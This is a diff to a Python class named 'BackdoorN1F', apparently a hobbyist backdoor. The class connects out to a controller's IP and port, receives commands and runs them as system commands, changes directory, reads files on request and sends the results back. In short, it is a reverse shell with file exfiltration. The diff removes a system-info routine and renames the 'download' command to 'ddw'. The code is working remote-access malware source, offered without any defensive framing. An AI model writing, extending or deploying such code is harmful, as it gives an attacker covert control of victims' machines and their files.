@@ -18,13 +18,6 @@ class BackdoorN1F:
         self.connectto = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connectto.connect((ip, port))
 
-    def basic_info(self):
-        uname = "uname -a"
-        info = subprocess.check_output(uname, shell=True)
-        #print(type(info))
-        #return bytes(info, encoding="utf-8")
-        return str(info)
-
 #   #####################################################################################
 #   Need to make it work ...
     def reliable_send(self, data):
@@ -56,12 +49,8 @@ class BackdoorN1F:
                 exit()
             if command[0] == "cd" and len(command) > 1:
                 command_result = self.change_dir(command[1]).encode("utf-8")
-            if command[0] == "download":
+            if command[0] == "ddw":
                 command_result = self.read_file(command[1])
-
-            if command[0] == "0":
-                command_result = self.basic_info().encode("utf-8")       #   basic info sending
-
             else:
                 command_result = self.execute_sys_command(command)
             self.reliable_send(command_result.decode("utf-8"))
